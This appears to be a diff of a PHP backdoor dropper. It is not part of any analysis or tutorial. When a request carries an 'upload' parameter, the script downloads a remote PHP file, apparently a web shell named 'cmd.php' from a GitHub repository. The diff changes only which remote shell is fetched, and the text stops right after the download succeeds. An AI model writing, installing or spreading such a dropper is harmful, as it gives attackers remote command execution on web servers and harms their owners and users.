@@ -1,6 +1,6 @@
 <?php 
 if (isset($_GET['upload'])) {
-    $url = "https://github.com/RaitoKazuki/sh/raw/refs/heads/main/ahay.php";
+    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/cmd.php";
     $fileContents = file_get_contents($url);
 
     if ($fileContents !== false) {
